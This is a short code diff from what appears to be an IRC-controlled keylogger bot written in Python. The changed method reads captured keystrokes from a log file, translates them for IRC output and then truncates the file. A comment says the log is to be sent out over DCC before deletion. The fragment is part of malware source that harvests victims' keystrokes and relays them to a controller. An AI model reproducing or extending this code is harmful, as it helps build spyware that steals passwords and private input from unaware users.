@@ -101,10 +101,11 @@ class Bot(irc.bot.SingleServerIRCBot):
 
     # Translate and print the keylog to console. Once finished, deletes file.
     def keylogs(self):
+        irc = True
         evlog = '/opt/col_log/evlog.txt'
         log = open(evlog, 'r+')
         f = log.read()
-        kl = key.translate(f)
+        kl = key.translate(f, irc)
         log.truncate()
         # MUST ADD DCC SEND BEFORE DELETING!!!!!
         log.close()
